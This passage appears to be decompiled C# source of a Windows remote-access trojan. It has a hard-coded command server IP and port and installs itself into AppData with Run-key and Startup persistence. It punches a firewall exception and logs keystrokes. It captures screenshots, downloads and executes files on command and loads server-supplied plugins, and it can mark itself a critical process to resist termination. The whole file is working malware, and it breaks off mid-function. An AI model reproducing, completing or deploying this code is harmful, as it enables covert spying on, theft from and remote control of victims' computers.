using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace j;

[StandardModule]
internal sealed class OK
{
	public static string VN = "SGFjS2Vk";

	public static string VR = "0.7d";

	public static object MT = null;

	public static string EXE = "server.exe";

	public static string DR = "AppData";

	public static string RG = "4b7f5fbef052312fadb4d8fe15ed0ebe";

	public static string H = "109.0.221.45";

	public static string P = "7006";

	public static string Y = "|'|'|";

	public static bool BD = Conversions.ToBoolean("False");

	public static bool Idr = Conversions.ToBoolean("True");

	public static bool IsF = Conversions.ToBoolean("True");

	public static bool Isu = Conversions.ToBoolean("True");

	public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly()!.Location);

	public static FileStream FS;

	public static Computer F = new Computer();

	public static kl kq = null;

	public static bool Cn = false;

	public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	public static TcpClient C = null;

	private static MemoryStream MeM = new MemoryStream();

	private static byte[] b = new byte[5121];

	private static string lastcap = "";

	public static object PLG = null;

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	public static void DLV(string n)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + RG, writable: true)!.DeleteValue(n);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object GTV(string n, object ret)
	{
		try
		{
			return ((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + RG)!.GetValue(n, RuntimeHelpers.GetObjectValue(ret));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return ret;
		}
	}

	public static bool STV(string n, object t, RegistryValueKind typ)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG)
				.SetValue(n, RuntimeHelpers.GetObjectValue(t), typ);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string inf()
	{
		string text = "ll" + Y;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(GTV("vn", ""), (object)"", false))
			{
				string text2 = text;
				string s = DEB(ref VN) + "_" + HWD();
				text = text2 + ENB(ref s) + Y;
			}
			else
			{
				string text3 = text;
				string s = Conversions.ToString(GTV("vn", ""));
				string s2 = DEB(ref s) + "_" + HWD();
				text = text3 + ENB(ref s2) + Y;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string s2 = HWD();
			text = text4 + ENB(ref s2) + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + Y;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + Y;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + LO.LastWriteTime.Date.ToString("yy-MM-dd") + Y;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text = text + "??-??-??" + Y;
			ProjectData.ClearProjectError();
		}
		text = text + "" + Y;
		try
		{
			text += ((ServerComputer)F).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			text += "0";
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + Y) : (text + " x64" + Y));
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			text += Y;
			ProjectData.ClearProjectError();
		}
		text = ((!Cam()) ? (text + "No" + Y) : (text + "Yes" + Y));
		text = text + VR + Y;
		text = text + ".." + Y;
		text = text + ACT() + Y;
		string text5 = "";
		try
		{
			string[] valueNames = ((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default)
				.GetValueNames();
			foreach (string text6 in valueNames)
			{
				if (text6.Length == 32)
				{
					text5 = text5 + text6 + ",";
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	public static string ENB(ref string s)
	{
		return Convert.ToBase64String(SB(ref s));
	}

	public static string DEB(ref string s)
	{
		byte[] B = Convert.FromBase64String(s);
		return BS(ref B);
	}

	public static byte[] SB(ref string S)
	{
		return Encoding.UTF8.GetBytes(S);
	}

	public static string BS(ref byte[] B)
	{
		return Encoding.UTF8.GetString(B);
	}

	public static byte[] ZIP(byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream(B);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}

	public static bool Cam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					string lpszVer = null;
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static string ACT()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return "";
			}
			string WinTitle = Strings.Space(checked(GetWindowTextLengthA((long)foregroundWindow) + 1));
			GetWindowTextA(foregroundWindow, ref WinTitle, WinTitle.Length);
			return ENB(ref WinTitle);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string HWD()
	{
		try
		{
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			string lpVolumeNameBuffer = null;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			int lpVolumeSerialNumber = default(int);
			GetVolumeInformationA(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			return Conversion.Hex(lpVolumeSerialNumber);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object Plugin(byte[] b, string c)
	{
		Module[] modules = Assembly.Load(b).GetModules();
		foreach (Module module in modules)
		{
			Type[] types = module.GetTypes();
			foreach (Type type in types)
			{
				if (type.FullName!.EndsWith("." + c))
				{
					return module.Assembly.CreateInstance(type.FullName);
				}
			}
		}
		return null;
	}

	public static void ED()
	{
		pr(0);
	}

	private static bool CompDir(FileInfo F1, FileInfo F2)
	{
		if (Operators.CompareString(F1.get_Name().ToLower(), F2.get_Name().ToLower(), false) != 0)
		{
			return false;
		}
		DirectoryInfo directoryInfo = F1.Directory;
		DirectoryInfo directoryInfo2 = F2.Directory;
		do
		{
			if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (!(directoryInfo == null && directoryInfo2 == null))
				{
					if (directoryInfo == null)
					{
						return false;
					}
					continue;
				}
				return true;
			}
			return false;
		}
		while (directoryInfo2 != null);
		return false;
	}

	public static void UNS()
	{
		pr(0);
		Isu = false;
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall delete allowedprogram \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (FS != null)
			{
				FS.Dispose();
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe");
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software", writable: true)!.DeleteSubKey(RG, throwOnMissingSubKey: false);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public static void INS()
	{
		Thread.Sleep(1000);
		if (Idr && !CompDir(LO, new FileInfo(Interaction.Environ(DR).ToLower() + "\\" + EXE.ToLower())))
		{
			try
			{
				if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
				{
					File.Delete(Interaction.Environ(DR) + "\\" + EXE);
				}
				FileStream fileStream = new FileStream(Interaction.Environ(DR) + "\\" + EXE, FileMode.CreateNew);
				byte[] array = File.ReadAllBytes(LO.FullName);
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
				fileStream.Close();
				LO = new FileInfo(Interaction.Environ(DR) + "\\" + EXE);
				Process.Start(LO.FullName);
				ProjectData.EndApp();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall add allowedprogram \"" + LO.FullName + "\" \"" + LO.get_Name() + "\" ENABLE", (AppWinStyle)0, true, 5000);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		if (Isu)
		{
			try
			{
				((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		if (IsF)
		{
			try
			{
				File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", overwrite: true);
				FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", FileMode.Open);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Ind(byte[] b)
	{
		//IL_06a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ae: Expected O, but got Unknown
		//IL_072c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0733: Expected O, but got Unknown
		string[] array = Strings.Split(BS(ref b), Y, -1, (CompareMethod)0);
		checked
		{
			try
			{
				switch (array[0])
				{
				case "ll":
					Cn = false;
					break;
				case "kl":
					Send("kl" + Y + ENB(ref kq.Logs));
					break;
				case "prof":
					switch (array[1])
					{
					case "~":
						STV(array[2], array[3], RegistryValueKind.String);
						break;
					case "!":
						STV(array[2], array[3], RegistryValueKind.String);
						Send(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(string.Concat("getvalue" + Y, array[1]), Y), GTV(array[1], ""))));
						break;
					case "@":
						DLV(array[2]);
						break;
					}
					break;
				case "rn":
				{
					byte[] bytes;
					if (array[2][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream5 = new MemoryStream();
							int length3 = (array[0] + Y + array[1] + Y).Length;
							memoryStream5.Write(b, length3, b.Length - length3);
							bytes = ZIP(memoryStream5.ToArray());
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							Send("MSG" + Y + "Execute ERROR");
							Send("bla");
							ProjectData.ClearProjectError();
							break;
						}
					}
					else
					{
						WebClient webClient2 = new WebClient();
						try
						{
							bytes = webClient2.DownloadData(array[2]);
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							Send("MSG" + Y + "Download ERROR");
							Send("bla");
							ProjectData.ClearProjectError();
							break;
						}
					}
					Send("bla");
					string text3 = Path.GetTempFileName() + "." + array[1];
					try
					{
						File.WriteAllBytes(text3, bytes);
						Process.Start(text3);
						Send("MSG" + Y + "Executed As " + new FileInfo(text3).get_Name());
						break;
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						Send("MSG" + Y + "Execute ERROR " + ex4.Message);
						ProjectData.ClearProjectError();
						break;
					}
				}
				case "inv":
				{
					byte[] array9 = (byte[])GTV(array[1], new byte[0]);
					if ((array[3].Length < 10) & (array9.Length == 0))
					{
						Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
						break;
					}
					if (array[3].Length > 10)
					{
						MemoryStream memoryStream7 = new MemoryStream();
						int length5 = (array[0] + Y + array[1] + Y + array[2] + Y).Length;
						memoryStream7.Write(b, length5, b.Length - length5);
						array9 = ZIP(memoryStream7.ToArray());
						STV(array[1], array9, RegistryValueKind.Binary);
					}
					Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
					object objectValue2 = RuntimeHelpers.GetObjectValue(Plugin(array9, "A"));
					NewLateBinding.LateSet(objectValue2, (Type)null, "h", new object[1] { H }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue2, (Type)null, "p", new object[1] { P }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue2, (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue2, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					while (!Conversions.ToBoolean(Operators.OrObject((object)(!Cn), Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue2, (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
					{
						Thread.Sleep(1);
					}
					NewLateBinding.LateSet(objectValue2, (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
					break;
				}
				case "ret":
				{
					byte[] array6 = (byte[])GTV(array[1], new byte[0]);
					if ((array[2].Length < 10) & (array6.Length == 0))
					{
						Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
						break;
					}
					if (array[2].Length > 10)
					{
						MemoryStream memoryStream6 = new MemoryStream();
						int length4 = (array[0] + Y + array[1] + Y).Length;
						memoryStream6.Write(b, length4, b.Length - length4);
						array6 = ZIP(memoryStream6.ToArray());
						STV(array[1], array6, RegistryValueKind.Binary);
					}
					Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
					object objectValue = RuntimeHelpers.GetObjectValue(Plugin(array6, "A"));
					string[] array7 = new string[5]
					{
						"ret",
						Y,
						array[1],
						Y,
						null
					};
					string[] array8 = array7;
					string S = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
					array8[4] = ENB(ref S);
					Send(string.Concat(array7));
					break;
				}
				case "CAP":
				{
					int width = Screen.get_PrimaryScreen().get_Bounds().Width;
					Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(width, rectangle.Height, (PixelFormat)135173);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Graphics obj = val2;
					Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
					obj.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					try
					{
						Cursor @default = Cursors.get_Default();
						Graphics obj2 = val2;
						Point position = Cursor.get_Position();
						size = new Size(32, 32);
						rectangle = new Rectangle(position, size);
						@default.Draw(obj2, rectangle);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					val2.Dispose();
					Bitmap val3 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
					val2 = Graphics.FromImage((Image)(object)val3);
					val2.DrawImage((Image)(object)val, 0, 0, ((Image)val3).get_Width(), ((Image)val3).get_Height());
					val2.Dispose();
					MemoryStream memoryStream2 = new MemoryStream();
					string S = "CAP" + Y;
					b = SB(ref S);
					memoryStream2.Write(b, 0, b.Length);
					MemoryStream memoryStream3 = new MemoryStream();
					((Image)val3).Save((Stream)memoryStream3, ImageFormat.get_Jpeg());
					string text = md5(memoryStream3.ToArray());
					if (Operators.CompareString(text, lastcap, false) != 0)
					{
						lastcap = text;
						memoryStream2.Write(memoryStream3.ToArray(), 0, (int)memoryStream3.Length);
					}
					else
					{
						memoryStream2.WriteByte(0);
					}
					Sendb(memoryStream2.ToArray());
					memoryStream2.Dispose();
					memoryStream3.Dispose();
					((Image)val).Dispose();
					((Image)val3).Dispose();
					break;
				}
				case "un":
					switch (array[1])
					{
					case "~":
						UNS();
						break;
					case "!":
						pr(0);
						ProjectData.EndApp();
						break;
					case "@":
						pr(0);
						Process.Start(LO.FullName);
						ProjectData.EndApp();
						break;
					}
					break;
				case "up":
				{
					byte[] array5 = null;
					if (array[1][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream4 = new MemoryStream();
							int length2 = (array[0] + Y).Length;
							memoryStream4.Write(b, length2, b.Length - length2);
							array5 = ZIP(memoryStream4.ToArray());
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							Send("MSG" + Y + "Update ERROR");
							Send("bla");
							ProjectData.ClearProjectError();
							break;
						}
					}
					else
					{
						WebClient webClient = new WebClient();
						try
						{
							array5 = webClient.DownloadData(array[1]);
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							Send("MSG" + Y + "Update ERROR");
							Send("bla");
							ProjectData.ClearProjectError();
							break;
						}
					}
					Send("bla");
					string text2 = Path.GetTempFileName() + ".exe";
					try
					{
						Send("MSG" + Y + "Updating To " + new FileInfo(text2).get_Name());
						Thread.Sleep(2000);
						File.WriteAllBytes(text2, array5);
						Process.Start(text2, "..");
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						Send("MSG" + Y + "Update ERROR " + ex2.Message);
						ProjectData.ClearProjectError();
						break;
					}
					UNS();
					break;
				}
				case "Ex":
				{
					if (PLG == null)
					{
						Send("PLG");
						int num = 0;
						while (!(unchecked(PLG != null || num == 20) | !Cn))
						{
							num++;
							Thread.Sleep(1000);
						}
						if ((PLG == null) | !Cn)
						{
							break;
						}
					}
					object pLG = PLG;
					object[] array2 = new object[1] { b };
					object[] array3 = array2;
					bool[] array4 = new bool[1] { true };
					NewLateBinding.LateCall(pLG, (Type)null, "ind", array3, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
					}
					break;
				}
				case "PLG":
				{
					MemoryStream memoryStream = new MemoryStream();
					int length = (array[0] + Y).Length;
					memoryStream.Write(b, length, b.Length - length);
					PLG = RuntimeHelpers.GetObjectValue(Plugin(ZIP(memoryStream.ToArray()), "A"));
					NewLateBinding.LateSet(PLG, (Type)null, "H", new object[1] { H }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(PLG, (Type)null, "P", new object[1] { P }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(PLG, (Type)null, "c", new object[1] { C }, (string[])null, (Type[])null);
					break;
				}
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				if (array.Length > 0 && ((Operators.CompareString(array[0], "Ex", false) == 0) | (Operators.CompareString(array[0], "PLG", false) == 0)))
				{
					PLG = null;
				}
				try
				{
					Send("ER" + Y + array[0] + Y + ex6.Message);
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string md5(byte[] B)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		B = mD5CryptoServiceProvider.ComputeHash(B);
		string text = "";
		byte[] array = B;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	public static void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool Sendb(byte[] b)
	{
		if (!Cn)
		{
			return false;
		}
		try
		{
			lock (LO)
			{
				if (!Cn)
				{
					return false;
				}
				MemoryStream memoryStream = new MemoryStream();
				string S = b.Length + "\0";
				byte[] array = SB(ref S);
				memoryStream.Write(array, 0, array.Length);
				memoryStream.Write(b, 0, b.Length);
				C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				if (Cn)
				{
					Cn = false;
					C.Close();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
		return Cn;
	}

	public static bool Send(string S)
	{
		return Sendb(SB(ref S));
	}

	public static bool connect()
	{
		Cn = false;
		Thread.Sleep(2000);
		lock (LO)
		{
			try
			{
				if (C != null)
				{
					try
					{
						C.Close();
						C = null;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					MeM.Dispose();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				MeM = new MemoryStream();
				C = new TcpClient();
				C.ReceiveBufferSize = 204800;
				C.SendBufferSize = 204800;
				C.Client.SendTimeout = 10000;
				C.Client.ReceiveTimeout = 10000;
				C.Connect(H, Conversions.ToInteger(P));
				Cn = true;
				Send(inf());
				try
				{
					string text = default(string);
					if (Operators.ConditionalCompareObjectEqual(GTV("vn", ""), (object)"", false))
					{
						text = text + DEB(ref VN) + "\r\n";
					}
					else
					{
						string text2 = text;
						string s = Conversions.ToString(GTV("vn", ""));
						text = text2 + DEB(ref s) + "\r\n";
					}
					text = text + H + ":" + P + "\r\n";
					text = text + DR + "\r\n";
					text = text + EXE + "\r\n";
					text = text + Conversions.ToString(Idr) + "\r\n";
					text = text + Conversions.ToString(IsF) + "\r\n";
					text = text + Conversions.ToString(Isu) + "\r\n";
					text += Conversions.ToString(BD);
					Send("inf" + Y + ENB(ref text));
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				Cn = false;
				ProjectData.ClearProjectError();
			}
		}
		return Cn;
	}

	public static void RC()
	{
		checked
		{
			while (true)
			{
				lastcap = "";
				if (C != null)
				{
					long num = -1L;
					int num2 = 0;
					try
					{
						while (true)
						{
							IL_0020:
							num2++;
							if (num2 == 10)
							{
								num2 = 0;
								Thread.Sleep(1);
							}
							if (!Cn)
							{
								break;
							}
							if (C.Available < 1)
							{
								C.Client.Poll(-1, SelectMode.SelectRead);
							}
							while (C.Available != 0)
							{
								if (num == -1L)
								{
									string text = "";
									while (true)
									{
										int num3 = C.GetStream().ReadByte();
										switch (num3)
										{
										case -1:
											goto end_IL_009c;
										case 0:
											num = Conversions.ToLong(text);
											text = "";
											if (num == 0L)
											{
												Send("");
												num = -1L;
											}
											if (C.Available <= 0)
											{
												goto IL_0020;
											}
											goto IL_00f3;
										}
										text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString()));
										continue;
										end_IL_009c:
										break;
									}
									break;
								}
								b = new byte[C.Available + 1];
								long num4 = num - MeM.Length;
								if (b.Length > num4)
								{
									b = new byte[(int)(num4 - 1L) + 1];
								}
								int count = C.Client.Receive(b, 0, b.Length, SocketFlags.None);
								MeM.Write(b, 0, count);
								if (MeM.Length == num)
								{
									num = -1L;
									Thread thread = new Thread(delegate(object a0)
									{
										Ind((byte[])a0);
									}, 1);
									thread.Start(MeM.ToArray());
									thread.Join(100);
									MeM.Dispose();
									MeM = new MemoryStream();
								}
								goto IL_0020;
								IL_00f3:;
							}
							break;
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				do
				{
					try
					{
						if (PLG != null)
						{
							NewLateBinding.LateCall(PLG, (Type)null, "clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							PLG = null;
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					Cn = false;
				}
				while (!connect());
				Cn = true;
			}
		}
	}

	public static void ko()
	{
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		if (Interaction.Command() != null)
		{
			try
			{
				((ServerComputer)F).get_Registry().get_CurrentUser().SetValue("di", "!");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(5000);
		}
		bool createdNew = false;
		MT = new Mutex(initiallyOwned: true, RG, out createdNew);
		if (!createdNew)
		{
			ProjectData.EndApp();
		}
		INS();
		if (!Idr)
		{
			EXE = LO.get_Name();
			DR = LO.Directory!.get_Name();
		}
		Thread thread = new Thread(RC, 1);
		thread.Start();
		try
		{
			kq = new kl();
			thread = new Thread(kq.WRK, 1);
			thread.Start();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		int num = 0;
		string text = "";
		if (BD)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					ED();
				});
				pr(1);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		while (true)
		{
			Thread.Sleep(1000);
			if (!Cn)
			{
				text = "";
			}
			Application.DoEvents();
			try
			{
				num = checked(num + 1);
				if (num == 5)
				{
					try
					{
